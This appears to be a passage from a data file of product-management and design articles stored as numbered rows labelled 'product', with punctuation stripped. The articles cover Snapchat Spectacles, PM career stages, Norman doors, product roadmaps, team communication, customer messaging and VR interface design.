streams  and that was it  Snapchat started from  frankly  who knows where  It was the most aggressive disrespect of systemic standards of software  I heard it argued a while ago that Snapchat s an unconventional UI was actually part of it s genius   it made the product somewhat viral because everyone had to teach each other how to use Snapchat  Snapchat themselves have had a interesting year  Aside from blowing up  they also released hardware for the first time  They took a really different approach from the likes of Apple  who are trying to get people to either replace or start wearing a watch  or Google Glass  who are trying to get people who don t wear glasses to wear glasses  Google actually had nothing to offer people who did wear glasses  which left them in a difficult situation  Snapchat said   Screw all that  Let s just sell some sunglasses   To me  that approach lines up  because they re targeting an existing behavior  sunglasses  with a better product  That is usually how good products happen  How do you see it  Paul  My take is pretty simple  These products are attempts at major breakthroughs for how people live and act  and the ones that are successful don t necessarily try to change people s behavior  They understand how people behave  act and think  and the new thing that emerges is congruent with that  This idea of building bridges to the future was very prevalent when I was at Google  Things like Google Glass and Google Wave  these were products that didn t really build bridges to the future  They were so different and forced people to act in totally new ways  People just didn t know what to do with them  Whereas Snapchat s glasses are sunglasses and that s it  They re sunglasses with a camera  and people wear sunglasses  If you actually watch the launch video for Snapchat s glasses  above   it s not people flying around on skateboards  It s literally a shot of normal life except they ve different sunglasses on  Google Glass s video had all this augmented reality  It was like a science fiction movie  It s obvious to me that the winners are the ones who don t try to radically alter society from the get go  Des  The bridge is the right concept for that  Snapchat could roll out a next version with a screen inside the lens that lets you see filters applied  but obviously they have to get there  Paul  Look at the development of the horse to the car  The very first things that emerged were basically horseless carriages  You can actually see a step by step progression  The winners are the ones who don t try to radically alter society from the get go  Fast forward to today and look at Tesla  The Tesla car doesn t need to look like a car  It doesn t have to have an engine at the front  The chassis is the mechanics of the car  but it still has something that looks like an engine and something that looks like a trunk  That s because people need this bridge  They re not going to buy a Tesla if it looks radically different to a car  Emmet  I wonder if this bridge to the future concept is especially true for consumer products  where no one wants to seem like a weirdo on a pseudo futuristic thing  The car is an interesting example  If you think about a thing that s likely to somehow achieve mass adoption at some stage over the next  x  years  it s self driving cars  There will be a gradual acceptance of the general public to self driving cars and your willingness to take your hands literally off the wheel and trust the computer  because that s a consumer use case  If you think about self driving trucks  fundamentally the same product  I would anticipate there will be an almost overnight switch as soon as it becomes possible from a regulation point of view  mostly from a bottom line finances  Some CFO of a massive company is going to make the switch overnight to self driving trucks  and likely the entire industry will follow within a very short amount of time  Shifting from product launch to iteration Des  You both spent a lot of the year working on our new Educate product  which is Intercom s take on a knowledge base  The product s launched  and we re in a different mode  What happens after launch for a team  Paul  It s been fascinating because the mode the team needs to work on almost the minute after the product launches is different to the one that they had before launch  This happens overnight  In the lead up to launch  design decisions are antagonized over for a long period of time  but they re at some point locked down  It was like   Do not open this conversation again  Do not increase the scope of this thing  Narrow  narrow  narrow  narrow  Get down to the hit list  Knock it off  Knock it off  Knock it off  No opening up of old things    The minute we launched  suddenly  that all goes away and everything s on the table again  It s the nature of all software that when you launch something  you ve got loads of stuff wrong  Loads  Even if you ve run a great beta  Suddenly  every single decision you made is up for debate again  It s very hard to suddenly accept that we might change it all and do it all a different way and iterate  A sign of a great product team is not what they ship in their version 1 0  It s version 1 1  Emmet  There s almost a tendency to become more conservative  You re thinking   We got it working  We finally got past the finish line   and now some people are using it and liking it  You have to be extremely brave at that point and say   There s a huge amount of input and information that we didn t have before   A sign of a great product team is not necessarily what they ship in their version 1 0  It s that version 1 1  That s when you really see how great a product team operates and thinks  how agile can they be in adapting to the new world where the rubber hits the road and their product is out there and they re getting feedback  Paul  Instagram impressed me in its early years because of it s simplicity  I was at Facebook when Instagram was acquired and the Instagram team was incredibly disciplined  There was pressure from all over the industry to add this or that  especially the minute Facebook acquired Instagram   Why doesn t Instagram have this feature if Facebook does and Facebook knows it works  They should just add it   The team was incredibly disciplined to keep Instagram really simple  A lot of Instagram s success in the early years was because it was so accessible and simple to understand  and they stuck to this core use case  Credit to them as Snapchat has moved the industry on  They ve been able to adapt and that is the sign of a great team  a team that can change  Des  They both represent proof that you do not need a large product footprint to have insane engagement  They re both relatively small product footprints  They have managed to get stronger  better  more engaging and more addictive without actually adding 15 more screens or 25 more workflows  which is stock B2B SaaS philosophy  What s to come in 2017 Des  We re going to do a lightning round  so short answers here  Voice as a user interface  will it be relevant in 2017  Paul  Absolutely  Huge  Emmet  No doubt  Des  Relevant in B2B as well  Emmet  Too early to say  Des  Conversational commerce   overhyped  absolute bullshit  very meaningful  Paul  Not overhyped  definitely a big deal  and probably has a bad name  Des  Conversational commerce is way too broad  Emmet  It still holds great promise for very specific use cases  but if you expect that all of commerce will move into your messenger you re probably sorely mistaken  Des  Virtual reality   will it be relevant in B2B and B2C in 2017 Emmet  Too early  I s time has come for gaming and that ll be exciting to see what the possibilities are  It doesn t feel like all the pieces are there yet  Des  Worst trend in product design today  Emmet  The silver bullet mentality  whether it s conversational commerce today  bots throughout this year or shiny buttons fifteen years ago  There s always something and you ve got to consider whether it s a trend or an actual new building block  Paul  AI  No one actually can define agreeably what AI even is  When most people say AI they mean if  then  this  that statements  Just take some humble pie and agree that we re not there yet  Des  What was your favorite new product of 2016 and why  Emmet  I have a very un sexy answer for this   the Belkin WeMo light switch  which has removed this very small but noticeable friction from my every night of shutting off all of the lamps around the room  At Google there used to be this concept of  does a product pass the toothbrush test  Would you use it at least a couple of times a day  This removes a very tiny thing but if you can make a tiny improvement a couple of times a day in every day of your life  that s decent  I will say that from a product point of view it s still a total mess  There s actually no system behind how home automation works to really tie it together so you have to Sellotape all the bits together  Paul  One of the most ingenious  amazing inventions of the past year was Tesla s roof tiles  Don t put these big panels on your house  just make tiles that do that instead  It harks back to the idea of building a bridge to the future   Would you rather  put this foreign looking sci fi object on your roof  or just swap out your tiles 
90,product,Developing as a Product Manager101 Flares 101 Flares    There are no guides to Product Management  As Ken Chin points out  the best way to learn about Product Management is to speak to people who have been doing it for longer than you  Unfortunately  because it is a relatively new discipline  there aren t that many out there   and those that there are  are in high demand  It s worth seeking out those people who have been working close to Product Management as there are a few more of them   Your first steps as Product Manager  At this stage in your career you should be trying to become the best PM you possibly can by focussing on the basic skills and techniques you need  Learn by speaking to people  reading extensively  getting to conferences meetups and watching videos from around the web  In order to earn the trust of your leadership  you need to make sure you can deliver as effectively and efficiently as possible   Senior Product Management  Once you ve learnt how to be a good Product Manager youself  you need to learn how to help other people improve  This benefits your own team and the performance of the wider organisation  increasing your own impact  You ll need to learn to consider the whole Product Team as your responsibility  taking on the management of disciplines that you aren t necessarily skilled in  You need to get obsessed with creating and leading a  great  team   that is your measure of success over and above your own personal contribution   Head   Director of Product Management  The biggest change is when you start to manage other Product Managers  At this stage you re not going to be hands on with any particular Product and this can be challenging to understand what good looks like  Here  the way that you add most value to the organisation is by making sure that these people are great  Hiring will be a big part of what you do and you can t settle   OK means no   otherwise your team won t be great  You re still earning trust and respect of your fellow leaders through delivery  but now it s the delivery of your team  If you are able to get that  then you can influence processes and decisions outside of your own product team s direct control   Chief Product Officer   VP  The company is your product and you re completely removed from the day to day delivery of your services   products  Your role is now to develop other leaders from across the organisation  not just product managers  Broader business results are the measure by which you earn trust as you now have responsibility for the overall way the organisation is set up  You ll be solving challenges that will go to the heart of your business such as finance  mergers   acquisitions and your cultural set up 
91,product,Using Norman doors to inform your next designWhile sitting in a cafe  I notice a really tall guy making his way through the outside area  He s at least 6 6  but he doesn t have to duck under the roof beams   It s interesting how the beams were designed to account for his height  and how everyone s sitting in a chair that fits their back  and they re drinking from cups that fit their hands   What s weird is the doors  I ve seen at least 3 people in the past hour try to walk inside by pushing straight into a  pull  door  When you look at how ergonomic the rest of the cafe is  it s a laughable oversight how counterintuitive it is to design a door with misleading design signals   These kinds of doors are called Norman doors  named after Don Norman  the author of The Design of Everyday Things and one half of the NNGroup  Norman doors appear as if they re push pull when they re actually the opposite  causing confusion and embarrassment to the user   Some even have labels to override the misleading signals   That made me wonder   If you need to label something  has it been poorly designed    Think of other usable objects in the cafe  cups  chairs  tables  You don t need to slap a  SIT  label on a chair  As you can see from the above image  even  a push and a pull door can look identical apart from the labels and doors don t always have labels   To get the heart of the matter  We understand most everyday design it because it has been conditioned into our heads ever since we learned to use it  But doors  They re designed with nothing more in mind than  this is a door   which raises an interesting parallel  Are we making the same mistakes in our user interfaces   While labels have been an easy get out in the past  are we now relying on them to awkwardly clarify confusing design   The problem is  we re not yet in the era where we have a standardized  universally recognized icon for everything   Here are a couple of examples   The great hamburger menu dispute of  14  The hamburger menu  while it flourished in popularity recently  has a long history  In fact  it appeared in one of the first GUIs ever on the Xerox Star in 1981  It was a contextual icon designed to  mimic the look of the resulting displayed menu list   says Geoff Alday   Although it started out with good intentions  as it gained visibility and ubiquity  the hamburger menu became a hot topic for debate among almost every single designer with a platform in 2014   In 2015  after giving the hamburger menu a home for quite some time in Chrome  Google decided to replace the hamburger menu with 3 vertical dots   Arguments in favor state that ellipses are a recognized sign for more or a continuation  which makes sense because we re more used to reading text than we are to using a UI specific element  But again  is making that alteration necessary when everyone s already used to the hamburger menu  That s a question that really starts to pick at the point I m making  If something works  and everyone understands it  is it worthwhile to innovate for innovation s sake   There s even more confusion when it comes to the many incarnations of the share button   The legendary share button mixup  also of  14   The launch of Mac OS X Yosemite and iOS 7 sent incredulous reverberations around the design community  As if we didn t already have enough share icons  Apple s gone and added another   The update in question concerned the 2 icons to the left  the latest of which Apple updated to match their download button  But as you can see  that was only the catalyst for discussion  Before that  there was a fair bit of innovation while designers decided the one true way to get users to share   Shareaholic released a Creative Commons graphic called the Open Share Icon with the hope to standardize it  but even still there s no agreed upon style   How Microsoft overcame this problem  and hundreds of other problems just like it   It s in situations like this where we re killing off labels and arguing over icons where it s important to remember the role of conditioning in UI design   Everything you do and everything you know is informed by your own conceived ideas and the influence of other forces  people  memories  etc    When you re attempting something totally new  something maybe a little more complex than an icon   it s historically interesting and useful to look back at how Microsoft introduced people to the GUI through their user onboarding experience   Microsoft had a unique issue in 1995  Since no one had gotten used to using the mouse to interact with objects on the screen  they had to get creative  Instead of burying the instructions in a giant user manual like had been done in the past  they constructed a user onboarding flow and made a game of it   Using now popular games like Minesweeper  Solitaire  and Hearts  they taught users to right click  drag and drop  and network with each other  In short  they tapped into the human desire to compete and gamify their life to get users onboarded with their software  This is the kind of care and attention that needed to go into the experience because it wasn t only teaching one piece of software  it was teaching how to use new hardware and totally new concepts to the mainstream buyer   Just like Microsoft was on the cusp of a revolution in 1995  we live in a world where users demand DWIM approaches and where confusing interfaces are starting to get outclassed by conversations  As clunky as Windows 95 feels to us now  next time you slam into a pull door  you have to admit they were onto something   Overcoming today s troublesome times of confusion  Going back to the cafe  Thing about the design of cups and all the different kinds of cups that have been popular over the years before we ve settled on something  pretty much  uniform  You ve got designs spanning all the way from hands to animal horns to modern mugs  evolving with that same turbulence as any UI standardization   In the meantime  the only thing we can hope to do is to live up to the expectations of our users  Now  that might not sound particularly creative  but it s sometimes necessary in the era where even doors an object that s existed since the dawn of architecture can be a source of confusion 
92,product,Making the MyLacroix com canThis year  Nelson Cash launched MyLacroix com  a website where you can create your own custom can design and imaginary flavor of Lacroix  The primary inspiration behind the site was Lacroix s iconic packaging  and it was imperative the can look just right   So  just how did we take it from IRL to GIF  Here s a behind the scenes look at our creative process   Step 1  Prepare can  Ever cut an aluminum can  Neither had we  Luckily  this lady had  Turns out cans aren t perfect cylinders  so most crafters discard the mouth piece  However  we needed to save this element because the design was full bleed  So we cut the mouth of the can into chunks and flattened to scan all of the pieces   Step 2  Create the SVG  Using Photoshop  we pieced the can back together and used Select Color Range to separate and clean each of the 6 colors  We then took the layered PSD into Illustrator and used Live Trace  a necessary evil    to vectorize each layer  We ensured placement of the art was correct  more on that later  and exported the final file as a SVG   Step 3  Create 3D render  While our developer was busy prepping the SVG  a fellow developer at Nelson Cash created the 3D render using 3D software  Like many art forms  working in 3D is all about building in layers broad strokes at first  then relentless refinement as you go  Therefore  the initial rendering resulted in a plain can   Step 4  Apply texture  Once we had the foundation of the can ready  it was time to apply texture  To do this  we completed a process called UV unwrapping  This provided the computer instructions to wrap a 2D image to the 3D object  similar to how we  unwrapped  the physical LaCroix can   Step 5  Translate to code  We then used Three js to translate the 3D assets into a browser 3D render  Three js is a JavaScript 3D library that makes WebGL the engine that allows you to see 3D in your browser substantially simpler for developers  Three js supplies a myriad of tools to help recreate real life effects  including lighting  reflection  shadows  and texture details  that really allows the Lacroix can to jump off the screen   There you have it  The can in all its natural essence   Create and share your own flavor at MyLaCroix com   Disclaimer  MyLacroix com is not affiliated with the manufacturers or distributors of Lacroix products  National Beverage Corp   or any of its related companies  in any way  shape  or can  None of the flavors generated on this site are real  They re simply figments of your fizzy imagination created by fans  just like you   This was originally posted on Medium   Read more from Nelson Cash
93,product,Mind the Product s Janna Bastow on building product roadmapsBuilding a great product is hard  Building a great product without a plan that accounts for iteration  quality control and user feedback is nearly impossible  That s where a well crafted product roadmap comes in  something Janna Bastow knows all about  A product manager by trade  Janna co founded ProdPad because she simply didn t have the proper tools to plan and manage her own roadmap and product backlog  She s also a co founder of Mind the Product  the premier global community and conference for people who live and breathe product  And in what free time she has left  Janna mentors other startups on how to build and grow responsibly  I hosted Janna on our podcast to discuss how product roadmaps must evolve at scale  exercises for prioritizing what you build and why every product manager must be able to say  No   If you like what you hear  check out more episodes of our podcast  You can subscribe on iTunes or grab the RSS feed  What follows is a lightly edited transcript of the interview  but if you re short on time  here are five key takeaways  A proper product roadmap is approached from two angles  It solves big objectives and builds toward your company vision  and it s flexible enough to accommodate changes in the marketplace  Inviting stakeholders from across your company into the discussion of what to build helps you analyze tradeoffs and requirements  To do this  Janna recommends an exercise called The Product Tree  Avoid aligning your roadmap to specific dates  instead  split your roadmap between shorter windows and longer time horizons  which allow for flexibility  As your product grows  you ll need to move away from a to do list of features and organize your roadmap by the problems that you re solving  If a feature request isn t aligned with a company s product vision and objectives  it s paramount that product managers say no   even to their boss  Tests and data are a PM s greatest ally here  Adam Risman  Janna  great to have you here  Product management is a very young field compared to the likes of design and engineering   and one that people come into from a variety of paths  What was yours  Janna Bastow  When I first started in product management I d actually never heard the term  I was a customer support rep for a tech company  and they liked the way that I was able to report bugs and talk to the customers  My boss pulled me aside one day and said   I d like to make you a junior product manager   My first reaction was  great  I like it  What is it  I actually had to Google it and figure out what my path was going to be and how I was going to figure out this new role  Having studied business and dabbled in tech and in design beforehand  I d never actually heard of the term product management  That s changing nowadays  Adam  When you re consulting with startups about product management  you always begin the projects with is a simple question  What problem are you solving with your product  What were the problems you encountered that led to the creation of ProdPad and Mind the Product  Janna  Two distinctly different problems  One was that I was a product manager and I wanted to learn from other product managers and there simply wasn t a lot of resources online  There certainly weren t a lot of product managers in my network  A couple of us decided to get a few people together in a room with some beers and start holding events for product managers  It started off as a product tank  which was maybe 20 people  and that s just grown and grown to Mind the Product over time  With ProdPad  I was a product manager and realized I didn t have the tools I needed to do my job  I was hacking apart Powerpoint  spreadsheets and whatever tools I could get my hands on  My co founder and I ended up building ProdPad  which was originally just a hack project and something to help us do our own jobs  It was only a couple of years later that we realized it was actually worth getting out there to other product managers  Where product roadmaps come from Adam  One thing that ProdPad helps with is constructing product roadmaps  Every company needs a plan for what they re going to build  but there are so many different ways to go about creating one  What inputs are you using for the product roadmap at ProdPad  Janna  A good roadmap is approached from two angles  You ve got the top down approach  which is outlining your vision  your objectives and the big steps you need to take to meet that vision  You can t just do top down product management  because that means that you re not paying attention to what s happening in the market  What feedback is coming in from your customers  You need to blend it with the bottom up approach  which is looking for all the opportunities out there  Which ideas are being surfaced by your team  What feedback is coming in from your customers  What are you learning as you re watching the markets or from new customers  By blending these two together you can actually create a roadmap that is flexible enough to allow you to change to what s happening in the market while still making sure that you re building towards your vision and solving the big objectives that are important to your company   Adam  Are any of those inputs harder to manage or balance  Janna  The part that most product managers struggle with is the influx of ideas and feedback from customers  It s not easy to gather everything in one place  close the loop on it and make sure what you re building is actually still relevant to customers   even though you first heard about it six months ago  It s this constant cycle of checking back and validating what you re doing  even if it is something that you ve been validating over time  You still need to make sure it s the right thing to build as it goes out the door  Building your Product Tree Adam  When it comes to prioritizing what to build  you use an interactive exercise called the Product Tree Game  What s the process there  How does the exercise work  Janna  The Product Tree Game is partly influenced by the folks behind innovation games  It s a great exercise  You can play with your team  different stakeholders within the company or even customers  You get your team together   different points of view  somebody from sales  somebody from support  somebody from development   and put them in a room and draw a massive tree on the whiteboard  The trunk represents the core features   the absolute must haves and what you have in place today  The branches represent different areas that you can go into  and the roots represent the infrastructure that s needed to build the tree  Get everyone to brainstorm and get everything down on Post It Notes  Then together have everyone stick them onto the tree and negotiate with each other as to where these particular features or ideas might go   Some stuff might be absolutely core and need to be right down by the core of the branch  These are the things that need to be built first  Other things might be a lot more nebulous or blue sky thinking  which might sit out in the further reaches of the branches  The infrastructure is also really important to have there  the roots  because this is where the developers get to have a say in what s going on  You might have a salesperson who says it would be really great if we could get this view of our users  The developer now has the chance to stand up and say   If we want to do that then we re going to have to build out this piece to hold the tree up   and start explaining why you need a good infrastructure  What you end up with is a picture of a tree  your product tree  and you can see right away looking at it whether or not it s balanced  Did everyone decide to go in one particular direction  Is that the right direction for the company or is that not quite in line with the vision  Do you have enough things in the infrastructure to support the bulk of new functionality that s requested  It s a good visual way to get people involved  see how many other things are happening at any point in time  weigh in on that and feel like they ve got input that s going into the roadmap  Adam  How often would a team want to complete an exercise like this  Janna  Probably no more than every six months  I certainly wouldn t recommend rethinking your entire roadmap any more than that  If you re updating a roadmap more than every couple months then you re probably changing your vision too much  Obviously smaller tweaks  are fine   but I wouldn t recommend revamping it  That would throw off everybody in the team and wouldn t really allow people understand where it is you re trying to go  Adam  There s going to be a lot on that tree that needs to be pared down after this exercise is complete  Who should actually have a role in putting these concepts back into the roadmap  and who should have access to that roadmap once it s completed  Janna  The product manager themselves should own the roadmap  It shouldn t be something that other people can stick things into or change on the product person  They should own the roadmap  but they should also do it with a good dose of transparency and understanding that it s being built based on the input of all these people  It s not just the product person saying   This is where we re going because I said so   You should be showing your internal team the whole roadmap  You should be showing your internal team the whole roadmap  Everything the product manager knows about what s coming up should be visible to people who are going to be building or supporting this thing in the coming months  When it comes to showing a version of the roadmap off to your bosses or your board or your customers you might want to pair things down  Sometimes it s because you don t want it to be leaked to your competitors  because you ve got something really secret coming up  It might be because some things are just mundane and aren t interesting to your customers or to the board  There s nothing wrong with having a slightly different version of the roadmap that you show internally versus externally  as long as they more or less tell the same story  Assign timeframes  not dates Adam  One thing you won t see on your roadmaps is specific deadline dates  You ve said product manager said focus on broader windows instead  Why is this so important  Janna  It separates out the deliverables that are happening in your release plan  The things that are being immediately built out  We do build to dates but we only build out two to four weeks out  a couple sprints  and anything beyond that we re actually open to change based on feedback that we re hearing  New things we ve learned based on what the competitors are doing  what the market s doing  what our customers are asking for  It actually allows us to be more flexible and change based on what we re seeing happening in the market  Adam  We ve written a lot about our roadmap structure  and we look at six weeks and six years out  What are your organizational principles  Janna  We build in terms of current  near term and future  Generally speaking we d be looking at something like two months  six months and beyond  It s not actually that far off from the Intercom way of looking at it  We ve heard of other ones that are now  next and future  or 333 type formats  It s whatever works best for the company   One thing that happens with roadmaps is that people tend to think about them in terms of calendar years  They look at it and say   This is what we can do in the year   and cut it off beyond that  In reality a much smaller company with a less mature product might only really have visibility  and need to have visibility  of the next three to six months  They don t have funding beyond that  They don t have customers yet  Whereas a much more mature company might think two to five to ten years beyond where the roadmap begins  The length of the roadmap should be dependent on the product itself and the maturity of the company  But the split of proportionally shorter time versus longer and longer time horizons makes a lot of sense  Adam  When you look at the short term deliverables it s obviously much easier to monitor progress and know what deliverables are realistic  When it comes to those big picture goals several years down the line  how often should you be revisiting or updating those  Janna  The longer term stuff should be revisited if you ve change your fundamental vision  It s something that needs to happen at a company level  Is there still a market for what they envision they d be three years down the line  Are they still in the right place  Usually as companies progress  if they re successful  they actually open up the ability to think further into the future  which allows them to have a broader vision to change what it is they were originally going for and bite off bigger pieces  It s natural that any company will revisit their vision and therefore their roadmap maybe every year or so  Measuring success Adam  As someone who works with a lot of startups on roadmaps  is there anything you frequently spot that folks should avoid  Janna  The trap I see product managers falling or small companies falling into is creating a roadmap that s made up completely of different features  When you re very young and you ve just got this MVP out there and a handful of customers giving you feedback there s actually nothing wrong with having a small set of features that are being built next  But as you go it becomes overwhelming to look at a roadmap that s a whole pile of features  and you ll need to start grouping them into themes around the kinds of problems you re solving  If you re building an MVP you might just these are the next 10 things to do  but as you start building out a bigger roadmap you need to communicate a bigger story than just   We re going to launch these features and see what happens   Adam  One reason people might fall victim to that feature list or a tendency to include dates on a roadmap is it serves as a checklist for showing success  With those things removed how should product managers measure their success and communicate it to leadership  Janna  Product managers are notoriously hard to measure  It s easy enough to measure the success of a product  You ve got metrics and objectives that product showed hit   particular conversion  revenue or growth targets  Product Managers sit in the middle and don t necessarily have easy things to track  Unlike a development team they re not tracked by number of tickets they complete or number of hours done  Unlike salespeople they don t have direct sales quota  Unlike support they don t have customer success metrics  The product manager is often judged by a mixture of these things  as well as how they re actually working in the team  This might come out at 360 degree reviews or other tools like that  Learning how to say  No  Adam  There s a great blog post you wrote   Is your boss hijacking your roadmap    We talk a lot about how product managers must be able to say no to requests  How exactly should they go about saying no to the boss  Janna  There are two major things that a product manager will on a regular basis have to say no to their boss about  One is saying no to giving dates  Short term it s expected that you re going to give a range for that date and be able to that this is coming out within a month or so  That s based on your team being able to provide you with some insight as to what s happening  Long term though it s worth pointing out that things like resources aren t known  Therefore neither are dates  You can turn back to your boss and say   You re asking me for a date on something that s a year and a half from now  We don t know how big the team is going to be  We don t know whether we re going to get that funding or hire the right people  How can I possibly give a specific date on this   That usually helps point out where there s going to be deficiencies in giving any sort of date on a future deliverables  If you feel it s not aligned then question it  The other thing you might have to say no to quite often is features  It s important to use things like the product vision and objectives to point out whether something s aligned or not  If you feel it s not aligned then question it  Ask why they think something is important  You might actually figure out that your HiPPO  highest paid person s opinion  has a different vision than you  in which case it s a more fundamental problem than just that one particular feature  You can also use tests and data to your advantage  If you re just bringing in your opinion versus the HiPPO  you re going to lose  If you re able to test and prove whether something s going to work or not  or move the needle in the way they expect it to  then you can do that before you commit to building something absolutely huge  Adam  Whether it be from an organizational leader or a customer  when do you actually find yourself at ProdPad saying yes to a feature request  What has to align  Janna  At the very least this would be something that I d expect more than one user has been asking for and is something that fits with our vision  It makes sense in the broader scheme of things with what we ve been looking at  There s also a little bit of gut feel in there  We ll talk to a customer and find out what it is they re trying to do and try to empathize and ask   Is this something that we also feel would be useful to ourselves or to other customers  Is this something we feel should actually fit in with something else we re working on   It opens up a lot of other conversations  As soon as we hear something new from one customer we ll turn to other ones and ask if it s a similar problem  Find out if it s something that has been irking other people but we possibly didn t hear about before  Often you ll find that if one customer s asking for something it might match with other people and therefore deserves to find a place in the roadmap somewhere  ProdPad  Mind the Product and beyond Adam  You just shipped a new version of ProdPad  How did you know it was time to look at building a whole new release rather than releasing a lot of these improvements incrementally  Janna  Incremental feature releases are great if you re testing if something is worthwhile even building  At this point in time we ve proven ProdPad  We have more than 600 customers and incrementally it s very difficult to improve things like making an app more stable or faster  We realized the tech behind it was at its upper limits and the best way to allow us to move it forward and create platform that we could continue iterating on was to build the front end again 
94,product,A Product Manager s Guide to Strong Team Communication129 Flares 129 Flares    Product managers and their more recent Agile brethren  product owners  hold one of the most demanding positions in an organisation  As the crucial nexus in the product development framework  their plate is all too often full with business demands  technical requirements  and marketing concerns  Product management in this context can feel like chaos  the type of which can either be controlled or skidding along thin ice  So how do you stay focused and organised  use team dynamics to your advantage and play to individual strengths     Learn the ins and Especially the Outs First  Budding product managers can easily feel overwhelmed when addressing the political dimensions of their enterprise  Depending on the corporate culture  these may play a bigger or smaller role in your everyday job   Locate your allegiances and loyalties first  and always be in the know  Analyse the dependencies of your product and the main stakeholders that will enable or inhibit progress   Routine is a Good Thing  Time is a fleeting resource  With the abundance of requests and decisions that your position demands  your schedule can easily look like a papier mach  model of Quasimodo s head  Compartmentalising and scheduling your duties is key  especially if you are directly responsible for a product key  Scheduling time to address their concerns will ensure that the team is receiving the appropriate attention  This is also tied to reciprocity  It will ensure that you are aware of the critical issues and  equally importantly  that the team knows they can count on you   Stick it out or Pack it in   Staying devoted to a course or product can be difficult  There are so many opportunities out there  why endure the hardship  Especially when your success depends entirely on the product  But if the product is not going anywhere  neither is your career as a product manager  However  some projects have a remarkably long gestation period  so patience is required   First  know which direction you want to move in and set firm milestones  Assess regularly and always question metrics  A marginal success can be merely the result of a random confluence of events  Always take incremental gains with a grain of salt   but take them as a success anyway   Be Proud of Your Product  Pride is not too often considered a good quality in business communication  but it can work wonders for team and corporate engagement  Pride feeds your passion as a product manager  and your team and colleagues can feel the conviction in your words  You should be the first to want to link your name to a product  and the first one to want to show it to people  If you feel the product does not fit your personal vision  make it fit  Pursuing a personal vision will increase your conviction and decision making effectiveness  and inspire others through your example  Everything we do affects those those around us to a greater or lesser degree  If you work on increasing the scope of your influence  collaborative relationships will become easier to manage and promote   Don t be Afraid to Listen  People fall behind  become demotivated  play personal and professional games  and smooth workflow management comes at great cost and experimentation  Stakeholder management is a tricky business  and pushing a personal agenda may be interpreted as narcissism  However  actual dedication to a product manifests  Reciprocity is key to human relationships  and something as simple as making sure that everybody is heard in a meeting will work wonders for your professional standing  Your time is a limited resource  but don t be afraid to share it with those who really need it   Develop Your Technical Skills  or Fake it Till you Make it   How are you going to plan iterations and build a reliable roadmap with your team without at least having a basic notion of the technologies they use  Talk with your tech and design leads often and always attend tech planning and review meetings  regardless of how peripheral your input might be  The best way to develop a perception of the technical implications of your product is to delve into its functional organisation  Look at the product architecture and the components involved  Understand their purpose  if not the underlying technical requirements  Understand the role of the key components of the product  and how they communicate  You will be in a much better position to explain to your CTO why you absolutely need those four weeks of backend refactoring   Work on Your Eloquence  Conciseness and preparation play huge roles in everyday communication  but even more so in the context of an enterprise  Nobody will listen to muddled or unclear messages  unless you hold tremendous respect in the corporate hierarchy   and that respect is for the most part earned  not awarded  It s critical that you show up on time  lay it on the line  and get out of the conversation while the going is good  Engage in negotiation with enthusiasm and a smile  Work your corporate support by building bridges  If a particular team or stakeholder that you depend on is reticent or openly hostile  arrange for lunch together or shop for an office visit  They will not necessarily love you  but there will be a rapport which will make working together easier in the future   Product management is tied directly to communication  The more expressive your style is  the better you will communicate the project demands and your views on them  The easiest way to convey this is by being truly passionate about the product  but always acknowledge the reality of the marketplace and the industry  When discussing products  act strongly but fairly  and use expressions like  what if  and  I need your help  regularly  As a product manager  you are fighting for solutions  and constant collaboration is the best way to achieve these  Despite the clich  that is typically associated with them  proactivity and engagement  in yourself and others  are truly the keys to success 
95,product,The messaging starter kit for customer engagement What is customer engagement   Fair question   Unless you re selling something as painfully obvious as garbage bags  you re going to need to cajole convince nudge your customers to keep using your product  At many different points of their lifecycle  you ll want them to feel something  know something  do something or say something   For modern software companies  messaging is the single most effective way to engage your customers  The more time and effort you spend sending the right message  to the right people  at the right time  the greater the chances they ll understand  retain and be able to recall that message   Over the past few years  we ve helped thousands of businesses create messages that help grow their business  and we re often asked what types of messages you should send to help engage your customers  That s why we put together a messaging starter kit to help get your customer engagement strategy off the ground  First you can read this post  which explains our thinking behind the message types  including successful examples from some of our customers  and then you can download a set of templates to help you create your own successful strategy   In the downloadable guide  you ll get examples of messages which will help you   Set new users up for success  Activate new users that might have dropped off  Avoid sending impersonal  poorly timed messages  Retain existing customers and turn them into long term  loyal users  We ve used messages like these to help grow and scale Intercom   we hope that by following this advice you can do the same   The Messaging Starter Kit for Customer Engagement Engage new users and convert them to active customers with our series of message templates   1  Check up messages  Many business pour thousands of hours into optimizing sign up buttons  while promptly ignoring the customers they ve already got  That s where check up messages come in   they let you proactively identify any issues customers might be having  so you can solve problems before they become deal breakers   Here are three basic messages you can start with   New user check up message   Ideal for gauging initial reactions to your product s features and finding out how your onboarding experience can be improved  Make sure you only send this message to customers who have completed onboarding and have actually started to engage with the product   In Intercom this means using message rules like  Signed up more than 30 days ago  and  Sessions is more than 10    Medium term check up message   As customers mature with your product and become more experienced  you can ask for deeper insights into whether specific features are helping with the job they re trying to do  Again  make sure your message is targeted to the right people  You won t learn much from checking in with people who haven t used your product in 6 months   Use message rules like  Signed more than 180 days ago  and  Last seen less than 7 days ago    Engaged user check up message   Long term  loyal customers are the cornerstone of your business  Their feedback is critical for understanding what s going right  and what s going wrong   Use message rules such as  Sessions is greater than 250    For check in messages  we always recommend you send them inside your app  in context  You re asking in the moment when their attention is on your product  not hours later when they are trying to clear out their inbox  You ll get more replies  and they will be much better quality   But however you decide to check in with your users  make sure you re asking the right users  It never makes sense to message your entire user list to ask how they re doing  or look for feedback on a feature   For example  one of our customers  New Relic wanted to get useful feedback about a new feature  Rather than spam their entire database with this request  they only targeted power users of the feature  21  replied with feedback  representing 2 5x more than their previous  non targeted survey 
96,product,How to get started with VR interface designGiven the similarity to traditional apps  the tried and tested mobile app workflows that designers have spent years refining won t go to waste and can be used to craft VR UIs  You re closer to designing VR apps than you think   Before describing how to design VR interfaces  let s step back and run through the process for designing a traditional mobile app   1  Wireframes  First  we ll go through rapid iterations  defining the interactions and general layout   2  Visual design  At this stage  the features and interactions have been approved  Brand guidelines are now applied to the wireframes  and a beautiful interface is crafted   3  Blueprint  Here  we ll organize screens into flows  drawing links between screens and describing the interactions for each screen  We call this the app s blueprint  and it will be used as the main reference for developers working on the project   Now  how can we apply this workflow to virtual reality   Setup  Canvas size  The simplest problems can be the most challenging  Faced with a 360 degree canvas  one might find it difficult to know where to begin  It turns out that UX and UI designers only need to focus on a certain portion of the total space   We spent weeks trying to figure out what canvas size would make sense for VR  When you work on a mobile app  the canvas size is determined by the device s size  1334   750 pixels for the iPhone 6 and roughly 1280   720 pixels for Android   To apply this mobile app workflow to VR UIs  you first have to figure out a canvas size that makes sense   Below is 